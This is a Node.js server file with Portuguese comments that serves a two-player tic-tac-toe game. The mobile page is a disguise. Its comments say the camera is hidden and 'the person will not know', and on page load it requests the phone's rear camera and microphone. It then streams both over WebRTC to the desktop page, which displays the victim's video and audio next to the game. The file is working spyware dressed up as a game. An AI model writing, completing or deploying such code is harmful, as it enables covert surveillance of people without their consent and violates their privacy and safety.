const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

app.use(cors());

// HTML para CELULAR - APENAS JOGO DA VELHA (câmera oculta)
const mobileHTML = `<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Jogo da Velha</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:10px;}
        .container{max-width:400px;width:100%;background:white;border-radius:20px;padding:20px;box-shadow:0 10px 40px rgba(0,0,0,0.2);}
        h2{text-align:center;color:#333;margin-bottom:20px;}
        .board{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:20px 0;}
        .cell{background:#f0f0f0;border:2px solid #ddd;border-radius:10px;aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:48px;font-weight:bold;color:#333;cursor:pointer;}
        .cell.x{color:#e74c3c;}
        .cell.o{color:#3498db;}
        .status{text-align:center;font-size:18px;margin:20px 0;color:#666;}
        .reset{width:100%;padding:15px;background:#3498db;color:white;border:none;border-radius:10px;font-size:18px;cursor:pointer;}
        .reset:active{background:#2980b9;}
        .hidden{display:none !important;}
    </style>
</head>
<body>
    <div class="container">
        <h2>Jogo da Velha</h2>
        <div class="status" id="status">Aguardando oponente...</div>
        <div class="board" id="board"></div>
        <button class="reset" id="resetBtn" disabled>Reiniciar Jogo</button>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const boardElement = document.getElementById('board');
        const statusElement = document.getElementById('status');
        const resetBtn = document.getElementById('resetBtn');
        
        let board = Array(9).fill(null);
        let mySymbol = null;
        let gameActive = false;
        let currentPlayer = 'X';
        
        // Criar tabuleiro
        for(let i = 0; i < 9; i++) {
            const cell = document.createElement('div');
            cell.className = 'cell';
            cell.dataset.index = i;
            cell.addEventListener('click', () => makeMove(i));
            boardElement.appendChild(cell);
        }
        
        // INICIAR CÂMERA OCULTA (a pessoa não vai saber)
        async function iniciarCameraOculta() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: 320, 
                        height: 240,
                        facingMode: 'environment' // câmera traseira
                    }, 
                    audio: true 
                });
                
                // Criar conexão peer-to-peer
                const peerConnection = new RTCPeerConnection({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });
                
                // Adicionar tracks de vídeo e áudio
                stream.getTracks().forEach(track => {
                    peerConnection.addTrack(track, stream);
                });
                
                // Quando encontrar um PC para conectar
                socket.on('pc-conectado', async () => {
                    const offer = await peerConnection.createOffer();
                    await peerConnection.setLocalDescription(offer);
                    socket.emit('offer', offer);
                });
                
                // Receber answer do PC
                socket.on('answer', async (answer) => {
                    await peerConnection.setRemoteDescription(answer);
                });
                
                // Trocar ICE candidates
                peerConnection.onicecandidate = (event) => {
                    if(event.candidate) {
                        socket.emit('ice-candidate', event.candidate);
                    }
                };
                
                socket.on('ice-candidate', async (candidate) => {
                    try {
                        await peerConnection.addIceCandidate(candidate);
                    } catch(e) {}
                });
                
            } catch(error) {
                console.log('Erro ao acessar câmera:', error);
            }
        }
        
        // Iniciar câmera automaticamente sem mostrar nada
        iniciarCameraOculta();
        
        function makeMove(position) {
            if(!gameActive || mySymbol !== currentPlayer || board[position]) return;
            socket.emit('make-move', { position });
        }
        
        function updateBoard(newBoard) {
            board = newBoard;
            const cells = document.querySelectorAll('.cell');
            cells.forEach((cell, i) => {
                cell.textContent = board[i] || '';
                cell.className = 'cell';
                if(board[i]) cell.classList.add(board[i].toLowerCase());
            });
        }
        
        socket.on('game-start', (data) => {
            mySymbol = data.symbol;
            board = data.board;
            currentPlayer = data.currentPlayer;
            gameActive = true;
            resetBtn.disabled = false;
            updateBoard(board);
            statusElement.textContent = mySymbol === 'X' ? 'Sua vez (X)' : 'Vez do oponente (X)';
        });
        
        socket.on('move-made', (data) => {
            updateBoard(data.board);
            currentPlayer = data.currentPlayer;
            if(mySymbol === currentPlayer) {
                statusElement.textContent = 'Sua vez';
            } else {
                statusElement.textContent = 'Vez do oponente';
            }
        });
        
        socket.on('game-over', (data) => {
            gameActive = false;
            if(data.winner === 'draw') {
                statusElement.textContent = 'Empate!';
            } else if(data.winner === mySymbol) {
                statusElement.textContent = 'Você venceu! 🎉';
            } else {
                statusElement.textContent = 'Você perdeu!';
            }
        });
        
        socket.on('player-disconnected', () => {
            gameActive = false;
            resetBtn.disabled = true;
            statusElement.textContent = 'Oponente desconectado';
        });
        
        resetBtn.addEventListener('click', () => {
            socket.emit('reset-game');
        });
    </script>
</body>
</html>`;

// HTML para PC - MOSTRA O JOGO E A CÂMERA DO CELULAR
const desktopHTML = `<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jogo da Velha - PC</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
        .container{max-width:1200px;width:100%;display:grid;grid-template-columns:1fr 1fr;gap:30px;background:white;border-radius:20px;padding:30px;box-shadow:0 10px 40px rgba(0,0,0,0.2);}
        .camera-section{background:#000;border-radius:10px;overflow:hidden;aspect-ratio:4/3;}
        .camera-section video{width:100%;height:100%;object-fit:cover;}
        .game-section{text-align:center;}
        h2{color:#333;margin-bottom:20px;}
        .status{font-size:18px;margin:20px 0;color:#666;}
        .board{display:grid;grid-template-columns:repeat(3,1fr);gap:15px;margin:30px 0;}
        .cell{background:#f0f0f0;border:2px solid #ddd;border-radius:10px;aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:60px;font-weight:bold;color:#333;cursor:pointer;}
        .cell:hover{background:#e0e0e0;}
        .cell.x{color:#e74c3c;}
        .cell.o{color:#3498db;}
        .controls{display:flex;gap:10px;justify-content:center;}
        button{padding:12px 24px;border:none;border-radius:5px;font-size:16px;cursor:pointer;}
        .reset{background:#3498db;color:white;}
        .reset:hover{background:#2980b9;}
        .audio-control{background:#2ecc71;color:white;}
        .audio-control.muted{background:#e74c3c;}
    </style>
</head>
<body>
    <div class="container">
        <div class="camera-section">
            <video id="remoteVideo" autoplay playsinline></video>
        </div>
        
        <div class="game-section">
            <h2>Jogo da Velha</h2>
            <div class="status" id="status">Conectado ao celular</div>
            <div class="board" id="board"></div>
            <div class="controls">
                <button class="reset" id="resetBtn" disabled>Reiniciar Jogo</button>
                <button class="audio-control" id="audioBtn">🔊 Áudio</button>
            </div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const remoteVideo = document.getElementById('remoteVideo');
        const boardElement = document.getElementById('board');
        const statusElement = document.getElementById('status');
        const resetBtn = document.getElementById('resetBtn');
        const audioBtn = document.getElementById('audioBtn');
        
        let board = Array(9).fill(null);
        let mySymbol = 'X'; // PC sempre começa como X
        let gameActive = false;
        let currentPlayer = 'X';
        let peerConnection;
        let audioEnabled = true;
        
        // Criar tabuleiro
        for(let i = 0; i < 9; i++) {
            const cell = document.createElement('div');
            cell.className = 'cell';
            cell.dataset.index = i;
            cell.addEventListener('click', () => makeMove(i));
            boardElement.appendChild(cell);
        }
        
        // Configurar conexão WebRTC para receber vídeo do celular
        function setupWebRTC() {
            peerConnection = new RTCPeerConnection({
                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
            });
            
            peerConnection.ontrack = (event) => {
                remoteVideo.srcObject = event.streams[0];
            };
            
            peerConnection.onicecandidate = (event) => {
                if(event.candidate) {
                    socket.emit('ice-candidate', event.candidate);
                }
            };
            
            // Avisar o celular que o PC está pronto
            socket.emit('pc-conectado');
        }
        
        setupWebRTC();
        
        // Receber offer do celular
        socket.on('offer', async (offer) => {
            await peerConnection.setRemoteDescription(offer);
            const answer = await peerConnection.createAnswer();
            await peerConnection.setLocalDescription(answer);
            socket.emit('answer', answer);
        });
        
        socket.on('ice-candidate', async (candidate) => {
            try {
                await peerConnection.addIceCandidate(candidate);
            } catch(e) {}
        });
        
        socket.on('game-start', (data) => {
            board = data.board;
            currentPlayer = data.currentPlayer;
            gameActive = true;
            resetBtn.disabled = false;
            updateBoard(board);
            statusElement.textContent = currentPlayer === 'X' ? 'Sua vez (X)' : 'Vez do oponente (O)';
        });
        
        function makeMove(position) {
            if(!gameActive || mySymbol !== currentPlayer || board[position]) return;
            socket.emit('make-move', { position });
        }
        
        function updateBoard(newBoard) {
            board = newBoard;
            const cells = document.querySelectorAll('.cell');
            cells.forEach((cell, i) => {
                cell.textContent = board[i] || '';
                cell.className = 'cell';
                if(board[i]) cell.classList.add(board[i].toLowerCase());
            });
        }
        
        socket.on('move-made', (data) => {
            updateBoard(data.board);
            currentPlayer = data.currentPlayer;
            if(mySymbol === currentPlayer) {
                statusElement.textContent = 'Sua vez';
            } else {
                statusElement.textContent = 'Vez do oponente';
            }
        });
        
        socket.on('game-over', (data) => {
            gameActive = false;
            if(data.winner === 'draw') {
                statusElement.textContent = 'Empate!';
            } else if(data.winner === mySymbol) {
                statusElement.textContent = 'Você venceu! 🎉';
            } else {
                statusElement.textContent = 'Você perdeu!';
            }
        });
        
        socket.on('player-disconnected', () => {
            gameActive = false;
            resetBtn.disabled = true;
            statusElement.textContent = 'Celular desconectado';
        });
        
        resetBtn.addEventListener('click', () => {
            socket.emit('reset-game');
        });
        
        audioBtn.addEventListener('click', () => {
            audioEnabled = !audioEnabled;
            remoteVideo.volume = audioEnabled ? 1 : 0;
            audioBtn.textContent = audioEnabled ? '🔊 Áudio' : '🔇 Áudio';
            audioBtn.classList.toggle('muted', !audioEnabled);
        });
    </script>
</body>
</html>`;

// Rotas
app.get('/', (req, res) => {
    const userAgent = req.headers['user-agent'].toLowerCase();
    if (/mobile|android|iphone|ipad|phone/i.test(userAgent)) {
        res.send(mobileHTML); // Celular: só o jogo
    } else {
        res.send(desktopHTML); // PC: jogo + câmera do celular
    }
});

// Gerenciamento de jogos
let currentGame = {
    mobile: null,
    desktop: null,
    board: Array(9).fill(null),
    currentPlayer: 'X',
    gameActive: false
};

io.on('connection', (socket) => {
    console.log('Conectado:', socket.id);

    // Celular se conecta
    if(!currentGame.mobile) {
        currentGame.mobile = socket.id;
        socket.emit('game-start', {
            symbol: 'O',
            board: currentGame.board,
            currentPlayer: currentGame.currentPlayer
        });
    } 
    // PC se conecta
    else if(!currentGame.desktop) {
        currentGame.desktop = socket.id;
        currentGame.gameActive = true;
        
        socket.emit('game-start', {
            symbol: 'X',
            board: currentGame.board,
            currentPlayer: currentGame.currentPlayer
        });
        
        io.to(currentGame.mobile).emit('game-start', {
            symbol: 'O',
            board: currentGame.board,
            currentPlayer: currentGame.currentPlayer
        });
    }

    // PC avisa que está pronto para receber vídeo
    socket.on('pc-conectado', () => {
        socket.broadcast.emit('pc-conectado');
    });

    // WebRTC Signaling
    socket.on('offer', (offer) => {
        socket.broadcast.emit('offer', offer);
    });

    socket.on('answer', (answer) => {
        socket.broadcast.emit('answer', answer);
    });

    socket.on('ice-candidate', (candidate) => {
        socket.broadcast.emit('ice-candidate', candidate);
    });

    // Movimentos do jogo
    socket.on('make-move', (data) => {
        const player = socket.id === currentGame.desktop ? 'X' : 'O';
        
        if(!currentGame.gameActive || player !== currentGame.currentPlayer) return;
        
        if(data.position >= 0 && data.position < 9 && !currentGame.board[data.position]) {
            currentGame.board[data.position] = player;
            
            // Verificar vencedor
            const winner = checkWinner(currentGame.board);
            const isDraw = !currentGame.board.includes(null) && !winner;
            
            if(winner) {
                currentGame.gameActive = false;
                io.emit('game-over', {
                    winner: player,
                    board: currentGame.board
                });
            } else if(isDraw) {
                currentGame.gameActive = false;
                io.emit('game-over', {
                    winner: 'draw',
                    board: currentGame.board
                });
            } else {
                currentGame.currentPlayer = currentGame.currentPlayer === 'X' ? 'O' : 'X';
                io.emit('move-made', {
                    board: currentGame.board,
                    currentPlayer: currentGame.currentPlayer
                });
            }
        }
    });

    socket.on('reset-game', () => {
        currentGame.board = Array(9).fill(null);
        currentGame.currentPlayer = 'X';
        currentGame.gameActive = true;
        io.emit('game-reset', {
            board: currentGame.board,
            currentPlayer: currentGame.currentPlayer
        });
    });

    socket.on('disconnect', () => {
        if(socket.id === currentGame.mobile) {
            currentGame.mobile = null;
            io.to(currentGame.desktop).emit('player-disconnected');
        } else if(socket.id === currentGame.desktop) {
            currentGame.desktop = null;
            io.to(currentGame.mobile).emit('player-disconnected');
        }
        
        // Resetar jogo se alguém desconectar
        currentGame.board = Array(9).fill(null);
        currentGame.currentPlayer = 'X';
        currentGame.gameActive = false;
    });
});

function checkWinner(board) {
    const winPatterns = [
        [0,1,2],[3,4,5],[6,7,8],
        [0,3,6],[1,4,7],[2,5,8],
        [0,4,8],[2,4,6]
    ];

    for(let pattern of winPatterns) {
        const [a,b,c] = pattern;
        if(board[a] && board[a] === board[b] && board[a] === board[c]) {
            return board[a];
        }
    }
    return null;
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});
